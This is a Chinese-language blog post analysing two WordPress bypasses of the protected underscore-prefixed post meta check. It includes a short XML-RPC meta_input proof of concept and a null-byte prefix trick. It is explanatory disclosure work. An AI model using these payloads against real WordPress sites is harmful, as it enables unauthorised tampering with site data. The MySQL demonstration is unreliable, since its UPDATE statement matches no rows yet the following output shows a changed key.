---
title: Wordpress POST META_NAME校验绕过
date: 2017-09-05 00:00:00
tags: 漏洞分析
---

作者：Ambulong@vulspy

Wordpress中的POST META为`文章`的`自定义栏目/字段`，就如一篇`文章`中会有`标题`、`作者`等字段，但是对于有些主题/插件来说，`文章`中的自有字段显得不够用，就需要用到`自定义栏目/字段`。

*（该操作的位置在`添加/编辑文章`，在文本编辑框下方的`自定义栏目`，如果没有找到`自定义栏目`，需要在右上角的`显示选项`内将`自定义栏目`勾选。）*

`自定义栏目/字段`的数据以`meta_key`（字段/栏目名）->`meta_value`（值）的形式存放在`wp_postmeta`表内。以`下划线`开头的`meta_key`（字段/栏目名）被认为是保留字段，不允许用户添加。

本文将介绍如何绕过Wordpress的`meta_key`检查，添加字段/栏目名以`下划线`开头的`自定义栏目/字段`。

## 第一章 Wordpress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞

参考内容：[WordPress 4.7.5 Security and Maintenance Release](https://wordpress.org/news/2017/05/wordpress-4-7-5/)

### 1.1 POC

```php
$usr = 'author';
$pwd = 'author';
$xmlrpc = 'http://local.target/xmlrpc.php';
$client = new IXR_Client($xmlrpc);
$content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"xxx"));
$res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);
```
POC来自 [Wordpress SQLi — PoC by slavco](https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e)

### 1.2 漏洞分析

**补丁位置：[wp-includes/class-wp-xmlrpc-server.php](https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4#diff-6a81e4b18bb9bfe1f02588ddc35d801b) **

{% asset_img 1.2.1.png 漏洞分析 %}

根据补丁的内容，是将传入的$content_struct内容进行了白名单限制，同时也过滤了POC中的`meta_input`。

1.先看修复后的_insert_post函数中我们关注代码（文件：[wp-includes/class-wp-xmlrpc-server.php](https://github.com/WordPress/WordPress/blob/e88a48a066ab2200ce3091b131d43e2fab2460a4/wp-includes/class-wp-xmlrpc-server.php#L1297)）

```php
protected function _insert_post( $user, $content_struct ) {
	$defaults = array(
		...//ignore
		'custom_fields'  => null,
		'terms_names'    => null,
		'terms'          => null,
		'sticky'         => null,
		'enclosure'      => null,
		'ID'             => null,
	);
	$post_data = wp_parse_args( array_intersect_key( $content_struct, $defaults ), $defaults );
	...//ignore
	if ( isset( $post_data['custom_fields'] ) )
		$this->set_custom_fields( $post_ID, $post_data['custom_fields'] );
	...//ignore
	$post_ID = $update ? wp_update_post( $post_data, true ) : wp_insert_post( $post_data, true );
	if ( is_wp_error( $post_ID ) )
		return new IXR_Error( 500, $post_ID->get_error_message() );
	if ( ! $post_ID )
		return new IXR_Error( 401, __( 'Sorry, your entry could not be posted.' ) );
	return strval( $post_ID );
}
```

按正常的业务流程，POST META应当是从`custom_fields`中获取，之后带入set_custom_fields函数中，而且set_custom_fields函数会对`meta_key`进行检查，不应当存在问题。

但是在wp_update_post函数与wp_insert_post函数中，会从$post_data['meta_input']中取出数据，不经检查直接添加到`自定义栏目/字段`中。

2.函数wp_insert_post中我们关注的代码（文件：[wp-includes/post.php](https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L2974)）

```php
function wp_insert_post( $postarr, $wp_error = false ) {
	...//ignore
	$postarr = wp_parse_args($postarr, $defaults);
	unset( $postarr[ 'filter' ] );
	$postarr = sanitize_post($postarr, 'db');
	...//ignore
	if ( ! empty( $postarr['meta_input'] ) ) {
		foreach ( $postarr['meta_input'] as $field => $value ) {
			update_post_meta( $post_ID, $field, $value );
		}
	}
	...//ignore
}

```

## 第二章 Wordpress ≤ 4.8.2 POST META 校验绕过漏洞

**该章节更新时间：2017年11月09日**

吐槽：该缺陷于9月初[报告](https://hackerone.com/reports/265484)给WP Team，然而2个多月过去了仍然只有9月5号的一条回复。:(

Wordpress目前最新版为4.8.3，建议大家更新。

### 2.1 一个MySQL的trick

1). 正常的条件查询语句
```
mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
+---------+---------+----------------+------------+
| meta_id | post_id | meta_key       | meta_value |
+---------+---------+----------------+------------+
|       4 |       4 | _thumbnail_id  | TESTC      |
+---------+---------+----------------+------------+
1 row in set (0.00 sec)
```

2). 现在我们将_thumbnail_id修改成"\x00_thumbnail_id"
```
mysql> update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id';
Query OK, 0 rows affected (0.00 sec)
Rows matched: 0  Changed: 0  Warnings: 0
```

3). 再次执行第一步的查询
```
mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
+---------+---------+----------------+------------+
| meta_id | post_id | meta_key       | meta_value |
+---------+---------+----------------+------------+
|       4 |       4 |  _thumbnail_id | TESTC      |
+---------+---------+----------------+------------+
1 row in set (0.00 sec)
```

我们可以发现依然可以查询出修改后的数据。

### 2.2 POST META 校验绕过

我们来看下检查`meta_key`的代码，文件[./wp-includes/meta.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920)：
```php
function is_protected_meta( $meta_key, $meta_type = null ) {
    $protected = ( '_' == $meta_key[0] );

    /**
     * Filters whether a meta key is protected.
     *
     * [@since](/since) 3.2.0
     *
     * [@param](/param) bool   $protected Whether the key is protected. Default false.
     * [@param](/param) string $meta_key  Meta key.
     * [@param](/param) string $meta_type Meta type.
     */
    return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type );
}
```
`is_protected_meta`函数只检查了`$meta_key`的第一个字符是否以`_`开头。我们有了2.1的MySQL trick，想要绕过`meta_key`的检查就显得容易多了。

### 2.3 POC

在添加`自定义栏目/字段`时抓包，将_thumbnail_id替换为%00_thumbnail_id。

## 参考
* WordPress 4.7.5 Security and Maintenance Release - [https://wordpress.org/news/2017/05/wordpress-4-7-5/](https://wordpress.org/news/2017/05/wordpress-4-7-5/)
* Wordpress SQLi — PoC by slavco - [https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e](https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e)
